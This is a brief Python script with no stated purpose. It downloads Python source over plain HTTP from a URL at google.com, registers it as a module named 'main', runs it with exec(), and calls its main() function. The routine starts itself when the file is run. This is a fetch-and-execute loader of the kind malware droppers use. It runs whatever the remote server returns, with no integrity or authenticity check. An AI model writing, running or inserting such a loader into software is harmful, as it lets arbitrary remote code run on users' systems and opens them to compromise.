import sys
import types
import urllib.request

def execute():
    url = "http://google.com/execute.py"
    module_name = "main"

    response = urllib.request.urlopen(url)
    source = response.read().decode('utf-8')

    module = types.ModuleType(module_name)
    sys.modules[module_name] = module

    exec(source, module.__dict__)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
